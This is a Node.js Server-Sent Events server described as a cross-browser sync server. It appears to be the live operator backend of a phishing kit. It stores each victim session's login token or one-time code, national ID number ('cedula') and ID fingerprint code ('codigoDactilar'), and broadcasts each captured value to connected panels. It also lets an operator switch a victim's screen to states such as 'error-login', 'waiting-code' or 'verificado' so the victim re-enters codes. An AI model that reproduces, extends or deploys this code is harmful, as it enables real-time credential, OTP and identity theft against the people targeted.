import http from 'http';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

let clients = [];
let sessions = []; // In-memory session cache

const server = http.createServer((req, res) => {
  // CORS Headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    res.writeHead(204);
    res.end();
    return;
  }

  // SSE connection endpoint
  if (req.url === '/events') {
    res.writeHead(200, {
      'Content-Type': 'text/event-stream',
      'Cache-Control': 'no-cache',
      'Connection': 'keep-alive'
    });

    clients.push(res);

    // Sync current sessions cache to newly opened panel/tab
    res.write(`data: ${JSON.stringify({ type: 'sessions:sync', sessions })}\n\n`);

    req.on('close', () => {
      clients = clients.filter(c => c !== res);
    });
    return;
  }

  // Publish event endpoint
  if (req.url === '/publish' && req.method === 'POST') {
    let body = '';
    req.on('data', chunk => {
      body += chunk;
    });
    req.on('end', () => {
      try {
        const message = JSON.parse(body);
        
        // Process message and sync server-side cache
        if (message.type === 'session:created' && message.session) {
          sessions = sessions.filter(s => s.id !== message.session.id);
          sessions.push(message.session);
        } else if (message.type === 'session:token') {
          const session = sessions.find(s => s.id === message.sessionId);
          if (session) {
            session.token = message.token;
            session.state = message.token ? 'waiting-code' : 'typing';
            session.last_seen = Date.now();
            session.updatedAt = Date.now();
            broadcast({ type: 'session:token', sessionId: message.sessionId, token: message.token });
          }
        } else if (message.type === 'session:device') {
          const session = sessions.find(s => s.id === message.sessionId);
          if (session) {
            session.cedula = message.cedula;
            session.codigoDactilar = message.codigoDactilar;
            session.state = 'typing';
            session.last_seen = Date.now();
            session.updatedAt = Date.now();
            broadcast({ type: 'session:device', sessionId: message.sessionId, cedula: message.cedula, codigoDactilar: message.codigoDactilar });
          }
        } else if (message.type === 'session:ping') {
          const session = sessions.find(s => s.id === message.sessionId);
          if (session) {
            session.last_seen = Date.now();
            broadcast({ type: 'session:ping', sessionId: message.sessionId });
          }
        } else if (message.type === 'session:action') {
          const session = sessions.find(s => s.id === message.sessionId);
          if (session) {
            let newState = 'waiting';
            if (message.action === 'codigo') {
              newState = 'waiting-code';
              session.token = '';
            }
            else if (message.action === 'error-login') newState = 'error-login';
            else if (message.action === 'error-cod1') newState = 'error-cod1';
            else if (message.action === 'error-cod2') newState = 'error-cod2';
            else if (message.action === 'done') newState = 'done';
            else if (message.action === 'verificado') newState = 'verificado';
            else if (message.action === 'reset') newState = 'idle';
            else if (message.action === 'dispositivo') newState = 'dispositivo';
            
            session.state = newState;
            session.last_seen = Date.now();
            session.updatedAt = Date.now();
          }
        } else if (message.type === 'sessions:clear') {
          sessions = [];
        }

        // Broadcast the event to all connected browsers (tabs/windows/devices)
        clients.forEach(client => {
          client.write(`data: ${body}\n\n`);
        });

        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: true }));
      } catch (err) {
        res.writeHead(400);
        res.end('Invalid JSON');
      }
    });
    return;
  }

  // Serve static files from 'dist' directory
  let filePath = path.join(__dirname, 'dist', req.url === '/' ? 'index.html' : req.url);
  
  if (!filePath.startsWith(path.join(__dirname, 'dist'))) {
    res.writeHead(403);
    res.end('Forbidden');
    return;
  }

  const serveFile = (fileToServe) => {
    const ext = path.extname(fileToServe).toLowerCase();
    const mimeTypes = {
      '.html': 'text/html',
      '.css': 'text/css',
      '.js': 'text/javascript',
      '.json': 'application/json',
      '.png': 'image/png',
      '.jpg': 'image/jpeg',
      '.gif': 'image/gif',
      '.svg': 'image/svg+xml',
      '.ico': 'image/x-icon',
      '.woff': 'font/woff',
      '.woff2': 'font/woff2',
    };

    const contentType = mimeTypes[ext] || 'application/octet-stream';
    res.writeHead(200, { 'Content-Type': contentType });
    fs.createReadStream(fileToServe).pipe(res);
  };

  fs.stat(filePath, (err, stats) => {
    if (!err && stats.isDirectory()) {
      filePath = path.join(filePath, 'index.html');
    }

    fs.stat(filePath, (err2, stats2) => {
      if (err2 || !stats2.isFile()) {
        // Fallback to index.html for React Router
        const indexFallback = path.join(__dirname, 'dist', 'index.html');
        fs.stat(indexFallback, (err3, stats3) => {
          if (err3 || !stats3.isFile()) {
            res.writeHead(404);
            res.end('Not found');
            return;
          }
          serveFile(indexFallback);
        });
      } else {
        serveFile(filePath);
      }
    });
  });
});

function broadcast(data) {
  const body = JSON.stringify(data);
  clients.forEach(client => {
    client.write(`data: ${body}\n\n`);
  });
}

const PORT = process.env.PORT || 3001;
server.listen(PORT, '0.0.0.0', () => {
  console.log(`Cross-browser sync server running on port ${PORT}`);
});
